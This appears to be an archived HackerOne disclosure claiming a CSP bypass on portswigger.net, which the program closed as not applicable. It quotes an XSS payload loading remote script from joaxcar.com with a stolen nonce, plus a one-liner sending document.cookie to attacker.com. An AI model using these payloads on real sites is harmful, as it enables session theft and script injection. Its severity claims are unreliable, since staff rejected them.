---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/business-logic-errors
  - env/web
  - vuln/xss
  - fix/csp
  - fix/authentication-hardening
substate: "not-applicable"
weakness: "Business Logic Errors"
enriched: true
body: true
date: 2024-02-23
submitted: 2024-02-23T05:22:01.104Z
bounty_usd: null
votes: 48
cve: []
program: "[[programs/portswigger|PortSwigger Web Security]]"
reporter: "priyanshusharma9789"
source: "https://hackerone.com/reports/2387458"
title: "CSP Bypass and escalation of https://hackerone.com/reports/2279346"
---
# CSP Bypass and escalation of https://hackerone.com/reports/2279346

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 48 | **Program:** PortSwigger Web Security | **Disclosed:** 2024-02-23

- Report: [https://hackerone.com/reports/2387458](https://hackerone.com/reports/2387458)
- CWE: Business Logic Errors
- Submitted: 2024-02-23T05:22:01.104Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello Team , 

I have gone through this report https://hackerone.com/reports/2279346 and their is CSP bypass where website has implemented security in that but after this i can escalate Again CSP bypass with using different Script .

As shown in https://hackerone.com/reports/2279346 report website rectify the scripts like: 

document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//joaxcar.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
</div>
">`


But their is new way where i can escalate the bug with new script which is : 

var demo=document.createElement("img");
demo.src="https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"; 
document.body.innerHTML="";demo.width="1000"; demo.height="1000";
document.body.appendChild(demo);

F3074920


Steps: 
Go to https://portswigger.net/
Inject the script in console tab and see the impact

In this website configuration on CSP header is not proper . In my attachment their is no header for img in CSP . So attacker can escalate the bug again with different scripts.
F3074919

Thanks 
Priyanshu

## Impact

Escalate the bug with new script

CSP bypass using img script.

## Timeline

- **Report Filed**
- **Report Not Applicable**
- **2024-02-23** @priyanshusharma9789: Okay , If img is not impactful then with using of CSP exfilteration tag I'm able to do open redirection and session hijacking by only injecting of :

var sessionid = document.cookie.split('=')[1]+"."; 
document.location = "https://attacker.com/?" + sessionid; 

this is the worst scenario where i get session id's and open rediection easily .

Reference : https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
- **2024-02-23** @garethheyes: Go to devtools, go to the elements tab, edit HTML and add an image tag to an arbitrary location and observe that our CSP will block the request.
- **Comments Closed**
- **Report Reopened**
- **Report Not Applicable**
- **Agreed On Going Public**
- **2024-02-23** @albinowax: Hi, we've initiated disclosure as requested via email.
- **Agreed On Going Public**
- **Report Became Public**
- **2024-02-23** @priyanshusharma9789: I want to give me remarks for great work
